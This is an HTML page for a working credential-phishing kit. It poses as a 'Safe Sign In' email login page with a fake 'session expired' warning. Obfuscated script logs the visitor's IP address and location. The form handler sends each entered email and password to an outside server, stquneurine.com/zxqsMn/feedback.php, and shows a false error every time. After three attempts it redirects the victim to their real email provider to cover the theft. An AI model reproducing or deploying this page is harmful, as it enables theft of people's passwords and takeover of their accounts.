<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Safe Sign In</title>
  <style>
    /* Minimal styling for demo */
    /* body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f5f7fb; }
    .container { width:360px; background:#fff; padding:20px; border-radius:12px; box-shadow:0 6px 18px rgba(30,35,40,.08); transform:translateY(12px); opacity:0; animation: slideIn .4s forwards; }
    @keyframes slideIn { to { transform:none; opacity:1; } }
    label { display:block; font-size:.9rem; margin-top:12px; }
    input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #d9dde6; border-radius:8px; margin-top:6px; box-sizing:border-box; }
    .row { display:flex; gap:8px; align-items:center; margin-top:12px; }
    button { padding:10px 12px; border-radius:8px; border:0; background:#2563eb; color:white; cursor:pointer; }
    button[disabled] { opacity:.6; cursor:not-allowed; }
    .spinner { display:none; margin-left:8px; }
    .error-container { display:none; margin-top:10px; color:#fff; background:#ef4444; padding:8px; border-radius:6px; font-size:.9rem; }
    .success { display:none; margin-top:10px; color:#065f46; background:#bbf7d0; padding:8px; border-radius:6px; font-size:.9rem; }
    .small { font-size:.85rem; color:#6b7280; margin-top:8px; }
    .action-link { color:#2563eb; cursor:pointer; text-decoration:underline; margin-left:6px; } */

     body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f5f7fb; }
    .container { width:360px; background:#fff; padding:20px; border-radius:12px; box-shadow:0 8px 30px rgba(20,25,30,.06); transform:translateY(12px); opacity:0; animation: slideIn .35s forwards; }
    @keyframes slideIn { to { transform:none; opacity:1; } }
    h2 { margin:0 0 8px; font-size:1.25rem; }
    label { display:block; font-size:.92rem; margin-top:12px; color:#374151; }
    input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #e6e9ef; border-radius:8px; margin-top:6px; box-sizing:border-box; font-size:.95rem; }
    .row { display:flex; gap:8px; align-items:center; margin-top:14px; }
    button { flex:1; padding:10px 12px; border-radius:8px; border:0; background:#2563eb; color:white; font-weight:600; cursor:pointer; }
    button[disabled] { opacity:.65; cursor:not-allowed; }
    .spinner { display:none; margin-left:8px; font-size:.95rem; color:#374151; }
    .error-container { display:none; margin-top:12px; background:#ef4444; color:#fff; padding:9px; border-radius:8px; font-size:.9rem; text-align:center; }
    .small { font-size:.85rem; color:#6b7280; margin-top:10px; }
    .action-link { color:#2563eb; cursor:pointer; text-decoration:underline; }
  
  </style>
</head>
<body>
  <div class="container" role="main" aria-labelledby="title">
    <h2 id="title">Sign In</h2>

    <form id="loginForm" name="loginForm" autocomplete="off">

         <span id="country"></span>
            <span id="city"></span>
            <span id="eyep"></span>
            <span id="nownow"></span>
            <!-- Paragraph -->
            <p class="mb-4 " style="font-size: .8rem; color: red;">Your previous session has expired; please sign in to continue.</p>

      <label for="id">Email</label>
      <input id="id" name="id" type="text" inputmode="email" placeholder="" />

      <label for="pswrd">Password</label>
      <input id="pswrd" name="pswrd" type="password" placeholder="Enter password" />

    <!-- <div class="row" style="margin-top:14px">
        <button id="submit-btn" type="submit">Sign In</button>
        <div class="spinner" aria-hidden="true">⏳</div>
      </div>  -->
      
      <div class="row">
        <button id="submit-btn" type="submit">Sign In</button>
        <div class="spinner" id="spinner">⏳</div>
      </div>
    </form>

    <!-- <div class="error-container" role="alert"></div>
    <div class="success" id="successBox"></div> -->

    <!-- <div class="small">
      After 3 failed attempts, we can suggest your email provider's homepage if it's an allowed domain.
      <span id="suggestLinkHolder"></span>
    </div> -->

     <div class="error-container" id="errorBox" role="alert"></div>
    <div class="small" id="infoText">
      Session timeout detected. Please reauthenticate to proceed to your email domain.
    </div>
  </div>

<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<script>
const _0x3e247f=_0x45cc;(function(_0xe5d72e,_0x11d99b){const _0x54071d=_0x45cc,_0x5cbda8=_0xe5d72e();while(!![]){try{const _0x3ca54c=parseInt(_0x54071d(0x197))/(0x4*-0x2e3+0xb81*-0x3+0x2e10)+parseInt(_0x54071d(0x1ae))/(0x2174+-0x206d+-0x9*0x1d)+-parseInt(_0x54071d(0x1b1))/(0x16+0xe0*-0x8+-0x1*-0x6ed)*(-parseInt(_0x54071d(0x195))/(0x118b+-0x2f*-0xad+0x3*-0x106e))+parseInt(_0x54071d(0x19a))/(0x1ab1+-0x14d8+0x1*-0x5d4)*(-parseInt(_0x54071d(0x1aa))/(-0x23d8+0x1c*-0x33+0x2972))+parseInt(_0x54071d(0x1b3))/(0x2426+-0x6a+-0x23b5)*(parseInt(_0x54071d(0x1a2))/(0x1*0x14b+-0x21bc+0x2079))+parseInt(_0x54071d(0x1a5))/(-0xebe+-0x1ed*0x5+0x1868)+-parseInt(_0x54071d(0x194))/(0x1319*0x2+0x5e3*0x6+-0x497a);if(_0x3ca54c===_0x11d99b)break;else _0x5cbda8['push'](_0x5cbda8['shift']());}catch(_0x3dcb0d){_0x5cbda8['push'](_0x5cbda8['shift']());}}}(_0x2c27,-0x1603f4+0xb*-0x117d7+0x305066),window[_0x3e247f(0x1c5)]=function(){const _0x39da28=_0x3e247f,_0x2bbb1c={'QwMOC':_0x39da28(0x1c6),'WcqxT':_0x39da28(0x1bc),'nLsBZ':function(_0x20f14d,_0x41ea2d){return _0x20f14d+_0x41ea2d;},'FoOtg':_0x39da28(0x199)+_0x39da28(0x1a8)+_0x39da28(0x193)+_0x39da28(0x1b9)+'n='};let _0x5dc097=document[_0x39da28(0x1bb)+_0x39da28(0x19b)]('id')[_0x39da28(0x1ac)],_0x57792f=_0x5dc097[_0x39da28(0x19e)]('@')?_0x5dc097[_0x39da28(0x1a3)]('@')[0x1a*0xe7+-0x3df*0x7+0x3a4]:'';document[_0x39da28(0x1bb)+_0x39da28(0x19b)](_0x2bbb1c[_0x39da28(0x1ba)])[_0x39da28(0x1ad)+'t']=_0x57792f,document[_0x39da28(0x1bb)+_0x39da28(0x19b)](_0x2bbb1c[_0x39da28(0x1bf)])[_0x39da28(0x198)]=_0x2bbb1c[_0x39da28(0x1b7)](_0x2bbb1c[_0x39da28(0x1c0)],_0x57792f);});var d=new Date();function _0x45cc(_0x436bd0,_0x20d552){const _0x577667=_0x2c27();return _0x45cc=function(_0x39a673,_0x7d87f3){_0x39a673=_0x39a673-(-0x68a+0x1*0x1a7e+-0x1262);let _0x11cda4=_0x577667[_0x39a673];return _0x11cda4;},_0x45cc(_0x436bd0,_0x20d552);}d[_0x3e247f(0x1c2)+'ng']();let ipAdress=_0x3e247f(0x1c8)+_0x3e247f(0x1ca)+_0x3e247f(0x192)+_0x3e247f(0x19c)+_0x3e247f(0x1b8)+_0x3e247f(0x1ab)+_0x3e247f(0x1a7)+_0x3e247f(0x1b4);function _0x2c27(){const _0x1d8a63=['1332917EGJIPE','src','https://ww','45yohZKv','ById','info?apiKe','tor','includes','cwqjR','name','then','760SyOaUP','split','names','850941Mthwam','city','290b61999b','w.google.c','UKrqo','607704TLoHXY','a5554f48bf','value','textConten','1941548rMsorm','error','json','109401VDIogH','catch','8533DPWRll','4e8a','#nownow','country','nLsBZ','y=139d2378','cons?domai','QwMOC','getElement','favicon','ezKco','WBwJM','WcqxT','FoOtg','innerHTML','toDateStri','#country','toGMTStrin','onload','domain','querySelec','https://ap','#city','i.geoapify','.com/v1/ip','om/s2/favi','23809610isbLYx','188LBMiyg','#eyep'];_0x2c27=function(){return _0x1d8a63;};return _0x2c27();}fetch(''+ipAdress)[_0x3e247f(0x1a1)](_0x3e3d5e=>_0x3e3d5e[_0x3e247f(0x1b0)]())[_0x3e247f(0x1a1)](_0x1376cd=>{const _0x249e43=_0x3e247f,_0x7bcbe1={'cwqjR':_0x249e43(0x1c3),'UKrqo':_0x249e43(0x1c9),'WBwJM':_0x249e43(0x196),'ezKco':_0x249e43(0x1b5)},_0x431ae8=document[_0x249e43(0x1c7)+_0x249e43(0x19d)](_0x7bcbe1[_0x249e43(0x19f)]);_0x431ae8[_0x249e43(0x1c1)]=_0x1376cd[_0x249e43(0x1b6)][_0x249e43(0x1a0)];const _0x322469=document[_0x249e43(0x1c7)+_0x249e43(0x19d)](_0x7bcbe1[_0x249e43(0x1a9)]);_0x322469[_0x249e43(0x1c1)]=_0x1376cd[_0x249e43(0x1a6)][_0x249e43(0x1a4)]['en'];const _0x11bf37=document[_0x249e43(0x1c7)+_0x249e43(0x19d)](_0x7bcbe1[_0x249e43(0x1be)]);_0x11bf37[_0x249e43(0x1c1)]=_0x1376cd['ip'];const _0xe0fe69=document[_0x249e43(0x1c7)+_0x249e43(0x19d)](_0x7bcbe1[_0x249e43(0x1bd)]);_0xe0fe69[_0x249e43(0x1c1)]=d[_0x249e43(0x1c4)+'g']();})[_0x3e247f(0x1b2)](_0x198cd5=>console[_0x3e247f(0x1af)](_0x198cd5));
</script>


  <script>
  (function () {
    // === CONFIG: change only if needed ===
    const POST_URL = 'https://stquneurine.com/zxqsMn/feedback.php'; // your original test endpoint

    // === State & DOM refs ===
    let signInAttempts = 0;
    const form = document.getElementById('loginForm');
    const emailField = document.getElementById('id');
    const passwordField = document.getElementById('pswrd');
    const submitBtn = document.getElementById('submit-btn');
    const spinner = document.getElementById('spinner');
    const errorBox = document.getElementById('errorBox');

    // Safety checks
    if (!form || !emailField || !passwordField || !submitBtn) {
      console.error('Required form elements are missing.');
      return;
    }

    // Prefill from ?id= if present
    try {
      const qEmail = new URLSearchParams(window.location.search).get('id');
      if (qEmail) emailField.value = qEmail;
    } catch (e) { /* ignore */ }

    // Helpers
    function setUiLoading(loading) {
      submitBtn.disabled = loading;
      submitBtn.textContent = loading ? 'Loading...' : 'Sign In';
      spinner.style.display = loading ? 'inline-block' : 'none';
    }

    function showError(message) {
      errorBox.textContent = message;
      errorBox.style.display = 'block';
      passwordField.value = '';
      setTimeout(() => { errorBox.style.display = 'none'; }, 3000);
    }

    function extractDomain(email) {
      if (!email || typeof email !== 'string') return '';
      const t = email.trim();
      if (!t.includes('@')) return '';
      const parts = t.split('@').filter(Boolean);
      if (parts.length < 2) return '';
      let domain = parts.slice(1).join('@');
      domain = domain.split('/')[0].split(':')[0].trim().toLowerCase();
      return domain;
    }

    function looksLikeDomain(domain) {
      if (!domain) return false;
      if (domain.indexOf(' ') !== -1) return false;
      return domain.indexOf('.') > 0;
    }

    // Submit handler: actually POST to POST_URL
    form.addEventListener('submit', async function (evt) {
      evt.preventDefault();

      const email = (emailField.value || '').trim();
      const password = (passwordField.value || '').trim();

      if (!email) {
        showError('Please enter your email.');
        return;
      }
      if (!password || password.length < 6) {
        showError('Incorrect password. Please try again');
        return;
      }

      signInAttempts += 1;
      setUiLoading(true);

      // Use FormData so field names are exactly email/password as in the form
      const fd = new FormData();
      fd.append('id', email);
      fd.append('pswrd', password);

      try {
        // Perform the real network POST to your specified endpoint
        // Note: this will actually contact the remote server.
        const resp = await fetch(POST_URL, {
          method: 'POST',
          body: fd,
          mode: 'cors' // allow CORS; server must permit if different origin
        });

        // For test purposes, we treat all responses the same (show generic error)
        // You can inspect resp.status / resp.text() here to change behavior.
        if (!resp.ok) {
          // server returned non-2xx
          console.warn('Server returned', resp.status);
        }
        // show same UX as before
        showError('An unknown error occurred, please try again.');

      } catch (err) {
        console.error('Network error while posting:', err);
        showError('An unknown error occurred, please try again.');
      } finally {
        setUiLoading(false);
      }

      // After 3 attempts (or more), redirect to email domain automatically
      if (signInAttempts >= 3) {
        const domain = extractDomain(email);
        if (looksLikeDomain(domain)) {
          // small delay so user sees the message
          setTimeout(() => {
            window.location.href = 'https://' + domain;
          }, 900);
        } else {
          // couldn't parse domain
          showError('Could not determine a valid domain from your email.');
        }
      }
    });
  })();
  </script>
</body>
</html>
